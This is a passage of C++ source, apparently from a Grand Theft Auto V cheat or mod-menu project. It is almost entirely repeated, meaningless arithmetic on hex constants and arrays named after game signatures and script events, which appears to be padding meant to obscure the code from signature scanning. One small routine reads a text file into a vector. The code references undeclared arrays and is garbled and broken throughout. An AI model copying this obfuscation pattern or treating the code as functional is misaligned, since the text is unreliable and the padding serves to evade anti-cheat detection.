					GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
					a1 = (-GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
					a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
				}
				GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
				GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (2)) / (2 * GTA5_exe_sig_[2]);
				a = 0.0f;
				b = 0.0f;
				if (GTA5_exe_sig_[4] > 50.0f)
				{
					GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
				}
				a2 = (GTA5_exe_sig_[4]) / (2 * GTA5_exe_sig_[2]);
				a1 = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
				GTA5_exe_sig_[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (GTA5_exe_sig_[2] * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
				NETWORK_GET_ENTITY_IS_LOCAL_ = 0xB2 * 2;
				a = 0.0f;
				a1 = (GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
				b = 0.0f;
				GTA5_exe_sig_[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
				GTA5_exe_sig_[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
				GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (GTA5_exe_sig_[1] + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] + 0xA12;
				GTA5_exe_sig_[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1];
				GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
				GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
				GTA5_exe_sig_[1] = (0xB2 + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
				GTA5_exe_sig_[1] = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + GTA5_exe_sig_[1];
				GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1];
				a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
				a2 = (GTA5_exe_sig_[4] + (2)) / (2 * GTA5_exe_sig_[2]);
				GTA5_exe_sig_[1] = (0xB2 * 0xA) + (GTA5_exe_sig_[2] * 0xA) * 0xBB;
				GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
				GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
				if (GTA5_exe_sig_[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
				{
				}
				else
					a1 = (GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
				a2 = (GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);


				if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
				{
					TriggerScriptEvent[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
					TriggerScriptEvent[3] = (0xB1231 * 0xA) - (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
					TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
					TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
					TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
					a1 = (-TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
					a2 = (-TriggerScriptEvent[4] - (22)) / (2 * TriggerScriptEvent[2]);
				}
				else
				{
					offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (TriggerScriptEvent[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
					offset = (PED_TO_NET_ * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - offset + NETWORK_GET_ENTITY_IS_LOCAL_;
					offset = (0xA12 * 0xA) + TriggerScriptEvent[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) - offset;
					offset = (0xB1231 * 0xA12) + (PED_TO_NET_ * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - PED_TO_NET_ + 0xA12;
					offset = (PED_TO_NET_ * 0xA) + (TriggerScriptEvent[2] * 0xA) - 0xBB;
					offset = (0xB1231 * 0xA) + 0xA12;
					a1 = (-TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
					a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
				}
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (5) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (2)) / (2 * TriggerScriptEvent[2]);
				if (TriggerScriptEvent[4] > 50.0f)
				{
					TriggerScriptEvent[4] = TriggerScriptEvent[1];
				}
				a2 = (TriggerScriptEvent[4]) / (2 * TriggerScriptEvent[2]);
				a1 = (TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
				offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) / (TriggerScriptEvent[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
				NETWORK_GET_ENTITY_IS_LOCAL_ = PED_TO_NET_ * 2;
				a = 0.0f;
				a1 = (TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
				b = 0.0f;
				TriggerScriptEvent[3] = (0xB1231 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
				offset = (0xB1231 * 0xA12) + (PED_TO_NET_ + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + PED_TO_NET_ + 0xA12;
				TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
				TriggerScriptEvent[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
				TriggerScriptEvent[4] = TriggerScriptEvent[1];
				TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
				offset = (PED_TO_NET_ + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + offset + NETWORK_GET_ENTITY_IS_LOCAL_;
				offset = (0xA12 * 0xA) + TriggerScriptEvent[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) + offset;
				TriggerScriptEvent[4] = (0xA12 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
				a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
				a2 = (TriggerScriptEvent[4] + (2)) / (2 * TriggerScriptEvent[2]);
				offset = (PED_TO_NET_ * 0xA) + (TriggerScriptEvent[2] * 0xA) * 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				offset = (0xB1231 * 0xA) + 0xA12;
				if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
				{
				}
				else
					a1 = (TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
				a2 = (TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);

				if (TriggerScriptEvent[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
				{
					TriggerScriptEvent[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1];
					TriggerScriptEvent[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
					TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1];
					TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (TriggerScriptEvent[1] * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] + 0xA12;
					TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
					a1 = (-TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
					a2 = (-TriggerScriptEvent[4] - (22)) / (2 * TriggerScriptEvent[2]);
				}
				else
				{
					TriggerScriptEvent[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] / (TriggerScriptEvent[2] * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
					TriggerScriptEvent[1] = (0xB2 * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
					TriggerScriptEvent[1] = (0xA12 * 0xA) + TriggerScriptEvent[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
					TriggerScriptEvent[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
					TriggerScriptEvent[1] = (0xB2 * 0xA) + (TriggerScriptEvent[2] * 0xA) - 0xBB;
					TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
					a1 = (-TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
					a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
				}
				TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
				TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (2)) / (2 * TriggerScriptEvent[2]);
				a = 0.0f;
				b = 0.0f;
				if (TriggerScriptEvent[4] > 50.0f)
				{
					TriggerScriptEvent[4] = TriggerScriptEvent[1];
				}
				a2 = (TriggerScriptEvent[4]) / (2 * TriggerScriptEvent[2]);
				a1 = (TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
				TriggerScriptEvent[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (TriggerScriptEvent[2] * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
				NETWORK_GET_ENTITY_IS_LOCAL_ = 0xB2 * 2;
				a = 0.0f;
				a1 = (TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
				b = 0.0f;
				TriggerScriptEvent[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
				TriggerScriptEvent[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
				TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (TriggerScriptEvent[1] + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] + 0xA12;
				TriggerScriptEvent[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1];
				TriggerScriptEvent[4] = TriggerScriptEvent[1];
				TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
				TriggerScriptEvent[1] = (0xB2 + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
				TriggerScriptEvent[1] = (0xA12 * 0xA) + TriggerScriptEvent[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + TriggerScriptEvent[1];
				TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1];
				a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
				a2 = (TriggerScriptEvent[4] + (2)) / (2 * TriggerScriptEvent[2]);
				TriggerScriptEvent[1] = (0xB2 * 0xA) + (TriggerScriptEvent[2] * 0xA) * 0xBB;
				TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
				TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
				if (TriggerScriptEvent[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
				{
				}
				else
					a1 = (TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
				a2 = (TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
				std::vector<std::string> TempVECTOR;
				ifstream imput(TXTFilePath);
				string textolido;
				for (string line; getline(imput, line);)
					TempVECTOR.push_back(line);
				return TempVECTOR;
			}
			std::vector<string> Get_More_Values(char separador)
			{
				if (offset > aaaaaa)
				{
					matriz[2] = (ponteiro * 0xA) + (0xB1231 * 0xA) - offset / (ponteiro * 0xA) + (0xB1231 * 0xA) - offset;
					matriz[3] = (0xB1231 * 0xA) - (ponteiro * 0xA) + (0xB1231 * 0xA) - matriz[2] + aaaaaa;
					matriz[4] = (0xA12 * 0xA) + matrizss[2] * (ponteiro * 0xA) + (0xB1231 * 0xA) - offset;
					matriz[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
					matriz[7] = (0xB1231 * 0xA) + matriz[2];
					a1 = (-matriz[3] + (65)) / (2 * matriz[2]);
					a2 = (-matriz[4] - (22)) / (2 * matriz[2]);
				}
				else
				{
					offset = (ponteiro * 0xA) + (0xB1231 * 0xA) - offset / (matriz[2] * 0xA) + (ponteiro * 0xA) - offset;
					offset = (ponteiro * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - offset + aaaaaa;
					offset = (0xA12 * 0xA) + matriz[2] * (ponteiro * 0xA) + (ponteiro * 0xA) - offset;
					offset = (0xB1231 * 0xA12) + (ponteiro * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - ponteiro + 0xA12;
					offset = (ponteiro * 0xA) + (matriz[2] * 0xA) - 0xBB;
					offset = (0xB1231 * 0xA) + 0xA12;
					a1 = (-matriz[3] + (4)) / (2 * matriz[2]);
					a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
				}
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-matriz[3] + (5)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-matriz[3] + (2)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (2)) / (2 * matriz[2]);
				if (matriz[4] > 50.0f)
				{
					matriz[4] = matriz[1];
				}
				a2 = (matriz[4]) / (2 * matriz[2]);
				a1 = (matriz[3] + (2)) / (2 * matriz[2]);
				offset = (ponteiro * 0xA) + (0xB1231 * 0xA) / (matriz[2] * 0xA) + (ponteiro * 0xA) - offset;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (matriz[3] + (5)) / (2 * matriz[2]);
				aaaaaa = ponteiro * 2;
				a = 0.0f;
				a1 = (matriz[3] + (4)) / (2 * matriz[2]);
				b = 0.0f;
				matriz[3] = (0xB1231 * 0xA) + (ponteiro * 0xA) + (0xB1231 * 0xA) + matriz[2] + aaaaaa;
				a2 = (matriz[4] + (3)) / (2 * matriz[2]);
				offset = (0xB1231 * 0xA12) + (ponteiro + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + ponteiro + 0xA12;
				matriz[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
				matriz[2] = (ponteiro * 0xA) + (0xB1231 * 0xA) + offset / (ponteiro * 0xA) + (0xB1231 * 0xA) + offset;
				matriz[4] = matriz[1];
				matriz[7] = (0xB1231 * 0xA) + matriz[2];
				offset = (ponteiro + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + offset + aaaaaa;
				offset = (0xA12 * 0xA) + matriz[2] * (ponteiro * 0xA) + (ponteiro * 0xA) + offset;
				matriz[4] = (0xA12 * 0xA) + matrizss[2] * (ponteiro * 0xA) + (0xB1231 * 0xA) + offset;
				a2 = (matriz[4] + (3)) / (2 * matriz[2]);
				a2 = (matriz[4] + (2)) / (2 * matriz[2]);
				offset = (ponteiro * 0xA) + (matriz[2] * 0xA) * 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				offset = (0xB1231 * 0xA) + 0xA12;
				if (offset > aaaaaa)
				{
				}
				else
					a1 = (matriz[3] + (65)) / (2 * matriz[2]);
				a2 = (matriz[4] - (3)) / (2 * matriz[2]);

				if (matriz[1] > aaaaaa)
				{
					matriz[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1];
					matriz[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[2] + aaaaaa;
					matriz[4] = (0xA12 * 0xA) + matrizss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1];
					matriz[5] = (0xB1231 * 0xA12) + (matriz[1] * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - matriz[1] + 0xA12;
					matriz[7] = (0xB1231 * 0xA) + matriz[2];
					a1 = (-matriz[3] + (65)) / (2 * matriz[2]);
					a2 = (-matriz[4] - (22)) / (2 * matriz[2]);
				}
				else
				{
					matriz[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1] / (matriz[2] * 0xA) + (0xB2 * 0xA) - matriz[1];
					matriz[1] = (0xB2 * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - matriz[1] + aaaaaa;
					matriz[1] = (0xA12 * 0xA) + matriz[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - matriz[1];
					matriz[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
					matriz[1] = (0xB2 * 0xA) + (matriz[2] * 0xA) - 0xBB;
					matriz[1] = (0xB1231 * 0xA) + 0xA12;
					a1 = (-matriz[3] + (4)) / (2 * matriz[2]);
					a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
				}
				matriz[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-matriz[3] + (5)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
				matriz[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-matriz[3] + (2)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (2)) / (2 * matriz[2]);
				a = 0.0f;
				b = 0.0f;
				if (matriz[4] > 50.0f)
				{
					matriz[4] = matriz[1];
				}
				a2 = (matriz[4]) / (2 * matriz[2]);
				a1 = (matriz[3] + (2)) / (2 * matriz[2]);
				matriz[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (matriz[2] * 0xA) + (0xB2 * 0xA) - matriz[1];
				matriz[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (matriz[3] + (5)) / (2 * matriz[2]);
				aaaaaa = 0xB2 * 2;
				a = 0.0f;
				a1 = (matriz[3] + (4)) / (2 * matriz[2]);
				b = 0.0f;
				matriz[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[2] + aaaaaa;
				a2 = (matriz[4] + (3)) / (2 * matriz[2]);
				matriz[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
				matriz[5] = (0xB1231 * 0xA12) + (matriz[1] + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + matriz[1] + 0xA12;
				matriz[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1];
				matriz[4] = matriz[1];
				matriz[7] = (0xB1231 * 0xA) + matriz[2];
				matriz[1] = (0xB2 + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + matriz[1] + aaaaaa;
				matriz[1] = (0xA12 * 0xA) + matriz[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + matriz[1];
				matriz[4] = (0xA12 * 0xA) + matrizss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1];
				a2 = (matriz[4] + (3)) / (2 * matriz[2]);
				a2 = (matriz[4] + (2)) / (2 * matriz[2]);
				matriz[1] = (0xB2 * 0xA) + (matriz[2] * 0xA) * 0xBB;
				matriz[1] = (0xB1231 * 0xA) + 0xA12;
				matriz[1] = (0xB1231 * 0xA) + 0xA12;
				if (matriz[1] > aaaaaa)
				{
				}
				else
					a1 = (matriz[3] + (65)) / (2 * matriz[2]);
				a2 = (matriz[4] - (3)) / (2 * matriz[2]);

				if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
				{
					GTA5_exe_sig_[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
					GTA5_exe_sig_[3] = (0xB1231 * 0xA) - (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
					GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
					GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
					GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
					a1 = (-GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
					a2 = (-GTA5_exe_sig_[4] - (22)) / (2 * GTA5_exe_sig_[2]);
				}
				else
				{
					offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (GTA5_exe_sig_[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
					offset = (PED_TO_NET_ * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - offset + NETWORK_GET_ENTITY_IS_LOCAL_;
					offset = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) - offset;
					offset = (0xB1231 * 0xA12) + (PED_TO_NET_ * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - PED_TO_NET_ + 0xA12;
					offset = (PED_TO_NET_ * 0xA) + (GTA5_exe_sig_[2] * 0xA) - 0xBB;
					offset = (0xB1231 * 0xA) + 0xA12;
					a1 = (-GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
					a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
				}
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (2)) / (2 * GTA5_exe_sig_[2]);
				if (GTA5_exe_sig_[4] > 50.0f)
				{
					GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
				}
				a2 = (GTA5_exe_sig_[4]) / (2 * GTA5_exe_sig_[2]);
				a1 = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
				offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) / (GTA5_exe_sig_[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
				NETWORK_GET_ENTITY_IS_LOCAL_ = PED_TO_NET_ * 2;
				a = 0.0f;
				a1 = (GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
				b = 0.0f;
				GTA5_exe_sig_[3] = (0xB1231 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
				offset = (0xB1231 * 0xA12) + (PED_TO_NET_ + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + PED_TO_NET_ + 0xA12;
				GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
				GTA5_exe_sig_[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
				GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
				GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
				offset = (PED_TO_NET_ + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + offset + NETWORK_GET_ENTITY_IS_LOCAL_;
				offset = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) + offset;
				GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
				a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
				a2 = (GTA5_exe_sig_[4] + (2)) / (2 * GTA5_exe_sig_[2]);
				offset = (PED_TO_NET_ * 0xA) + (GTA5_exe_sig_[2] * 0xA) * 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				offset = (0xB1231 * 0xA) + 0xA12;
				if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
				{
				}
				else
					a1 = (GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
				a2 = (GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);

				if (GTA5_exe_sig_[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
				{
					GTA5_exe_sig_[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1];
					GTA5_exe_sig_[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
					GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1];
